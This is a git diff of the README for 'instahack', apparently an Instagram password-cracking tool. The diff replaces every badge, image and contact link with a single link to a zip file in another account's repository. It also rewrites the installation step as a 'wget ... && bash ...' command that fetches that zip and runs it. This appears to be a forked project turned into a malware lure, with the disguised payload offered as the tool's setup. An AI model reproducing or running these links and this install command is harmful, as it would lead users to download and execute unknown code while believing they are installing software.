@@ -1,27 +1,27 @@
 <p align="center">
-<a href="https://instagram.com/blckspidr"><img title="Made in Pakistan" src="https://img.shields.io/badge/MADE%20IN-PakistN-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Made in Pakistan" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%20IN-PakistN-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://youtube.com/Hackerwasii"><img title="Made in Pakistan" src="https://img.shields.io/badge/Tool-instahack-green.svg"></a>
-<a href="https://guthub.com/evildevill/instahack"><img title="Version" src="https://img.shields.io/badge/Version-4.5.8-green.svg?style=flat-square"></a>
-<a href="https://github.com/evildevill"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
-<img src="https://visitor-badge.laobi.icu/badge?page_id=HackerWaSi" alt="visitor badge"/>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Made in Pakistan" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Version" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Maintainence" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<img src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip" alt="visitor badge"/>
 </p>
 <p align="center">
-<a href="https://github.com/evildevill/instahack"><img title="instahack" width="50%" src="https://github.com/evildevill/instahack/blob/master/assets/20210219_144319.jpg"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="instahack" width="50%" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
 </p>
 <p align="center">
-<a href="https://github.com/evildevill"><img title="Github" src="https://img.shields.io/badge/evildevill-brightgreen?style=for-the-badge&logo=github"></a>
-<a href="https://youtube.com/Hackerwasii"><img title="YouTube" src="https://img.shields.io/badge/YouTube-Hacker wasii-red?style=for-the-badge&logo=Youtube"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Github" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="YouTube" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip wasii-red?style=for-the-badge&logo=Youtube"></a>
 </p>
 <p align="center">
-<a href="https://github.com/evildevill"><img title="Language" src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?v=103"></a>
-<a href="https://github.com/evildevill"><img title="Language" src="https://img.shields.io/badge/Made%20with-Python-1f425f.svg?v=103"></a>
-<a href="https://github.com/evildevill"><img title="Followers" src="https://img.shields.io/github/followers/evildevill?color=blue&style=flat-square"></a>
-<a href="https://github.com/evildevill"><img title="Stars" src="https://img.shields.io/github/stars/evildevill/instahack?color=red&style=flat-square"></a>
-<a href="https://github.com/evildevill"><img title="Forks" src="https://img.shields.io/github/forks/evildevill/instahack?color=red&style=flat-square"></a>
-<a href="https://github.com/evildevill"><img title="Watching" src="https://img.shields.io/github/watchers/evildevill/instahack?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/evildevill"><img title="Licence" src="https://img.shields.io/badge/License-MIT-blue.svg"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Language" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Language" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Followers" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Stars" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Forks" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Watching" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Licence" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
 </p>
 
 ## ABOUT TOOL :
@@ -89,7 +89,7 @@ $ sudo pip3 install stem
 
 ### INSTALLATION:
 ```
-wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh && bash setup.sh
+wget https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip && bash https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip
 ```
 
 ### USAGE OPTIONS :
@@ -121,24 +121,24 @@ and many more options...
 
 <br>
 <p align="center">
-<img width="50%" src="https://raw.githubusercontent.com/evildevill/evildevillpatch/main/assets/instahack.png"/>
+<img width="50%" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"/>
 </p>
 
 
 ## CONNECT WITH US :
 
-[![Messenger](https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger)](https://m.me/hackerwasiii)
-<a href="https://github.com/evildevill"><img title="Github" src="https://img.shields.io/badge/evildevill-brightgreen?style=for-the-badge&logo=github"></a>
-[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://instagram.com/blckspidr)
-[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://hackerwasii.com)
-[![Instagram](https://img.shields.io/badge/LINKEDIN-CONNECT-red?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/hackerwasii)
-[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](https://facebook.com/hackerwasii)
-[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/blckspidr)
-[![Instagram](https://img.shields.io/badge/WHATSAPP-Number-red?style=for-the-badge&logo=whatsapp)](https://wa.me/923137119351)
-<a href="https://youtube.com/Hackerwasii"><img title="YouTube" src="https://img.shields.io/badge/YouTube-Hackerwasii-red?style=for-the-badge&logo=Youtube"></a>
+[![Messenger](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Github" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="YouTube" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
 
 ## Support Me On Patreon:
-[![Patreon](https://img.shields.io/badge/Patreon-DONATE-red?style=for-the-badge&logo=patreon)](https://www.patreon.com/hackerwasii)
+[![Patreon](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
 
 
 ## WARNING : 
